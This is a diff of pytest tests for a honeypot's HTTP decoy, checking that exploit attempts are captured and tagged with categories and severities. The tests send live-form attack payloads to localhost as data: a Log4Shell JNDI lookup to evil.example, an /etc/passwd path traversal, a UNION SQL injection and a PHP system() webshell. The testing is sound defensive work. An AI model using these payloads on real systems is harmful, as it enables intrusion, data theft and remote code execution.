@@ -248,18 +248,25 @@ async def test_raw_body_capture_for_json_post(http_server):
         await buf.stop()
 
     async with get_session() as session:
+        # The body is a webshell, so it's now (correctly) re-tagged as an
+        # exploit attempt — but the raw body is still captured verbatim.
         result = await session.execute(
-            select(Alert).where(Alert.event_type.in_(("http_probe", "http_credential_submit")))
+            select(Alert).where(
+                Alert.event_type.in_(
+                    ("http_probe", "http_credential_submit", "http_exploit_attempt")
+                )
+            )
         )
         alerts = list(result.scalars().all())
     assert alerts, "expected at least one alert for the POST"
-    # Find the alert with the raw body — JSON POSTs land as http_probe
-    # because there's no form-parsed post_data.
     matching = [a for a in alerts if a.payload.get("raw_body_b64")]
     assert matching, "expected raw_body_b64 to be captured on JSON POST"
     decoded = base64.b64decode(matching[0].payload["raw_body_b64"])
     assert b"<?php system" in decoded, "raw body should preserve exploit payload verbatim"
     assert "application/json" in matching[0].payload["raw_content_type"]
+    # And the webshell must be flagged.
+    assert matching[0].event_type == "http_exploit_attempt"
+    assert "webshell" in matching[0].payload.get("exploit_categories", [])
 
 
 @pytest.mark.asyncio
@@ -350,3 +357,58 @@ async def test_kube_decoy_returns_kubeconfig_shape(http_server):
 
 # Avoid lint complaints about unused imports
 _ = contextlib
+
+
+@pytest.mark.asyncio
+async def test_http_exploit_signatures_detected(http_server):
+    """Exploit payloads across path / query / header / body must be flagged as
+    http_exploit_attempt with the right category and severity."""
+    from sqlalchemy import select
+
+    from honeypot_mcp.storage import event_buffer
+    from honeypot_mcp.storage.database import get_session
+    from honeypot_mcp.storage.models import Alert
+
+    port = http_server
+    buf = event_buffer.get_buffer()
+    await buf.start()
+    try:
+        async with httpx.AsyncClient(timeout=5.0) as client:
+            # Log4Shell in the User-Agent header.
+            await client.get(
+                f"http://127.0.0.1:{port}/",
+                headers={"User-Agent": "${jndi:ldap://evil.example/a}"},
+            )
+            # Path traversal + LFI in the query string.
+            await client.get(f"http://127.0.0.1:{port}/p?f=../../../../etc/passwd")
+            # SQL injection in the query string.
+            await client.get(
+                f"http://127.0.0.1:{port}/s?q=1 UNION SELECT user,pass FROM users"
+            )
+            # PHP webshell in a raw body.
+            await client.post(
+                f"http://127.0.0.1:{port}/up",
+                content=b"<?php system($_GET[c]); ?>",
+                headers={"Content-Type": "application/octet-stream"},
+            )
+        await asyncio.sleep(1.2)
+    finally:
+        await buf.stop()
+
+    async with get_session() as session:
+        result = await session.execute(
+            select(Alert).where(Alert.event_type == "http_exploit_attempt")
+        )
+        alerts = list(result.scalars().all())
+
+    cats = {c for a in alerts for c in a.payload.get("exploit_categories", [])}
+    assert {"log4shell", "path_traversal", "sqli", "webshell"}.issubset(cats), cats
+    # Log4Shell and webshell are CRITICAL.
+    sev_by_cat = {
+        c: a.severity.value
+        for a in alerts
+        for c in a.payload.get("exploit_categories", [])
+    }
+    assert sev_by_cat["log4shell"] == "critical"
+    assert sev_by_cat["webshell"] == "critical"
+    assert sev_by_cat["sqli"] == "high"
